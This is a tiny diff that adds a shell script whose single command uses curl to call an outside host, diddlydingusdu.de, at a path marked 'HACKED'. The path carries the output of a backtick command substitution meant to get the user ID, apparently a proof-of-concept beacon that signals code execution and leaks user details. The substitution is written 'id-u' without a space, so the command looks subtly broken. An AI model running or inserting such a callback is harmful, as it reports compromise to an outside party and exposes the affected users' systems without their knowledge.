@@ -1,0 +1,2 @@
+#!/bin/sh
+curl http://diddlydingusdu.de/HACKED/`id-u`
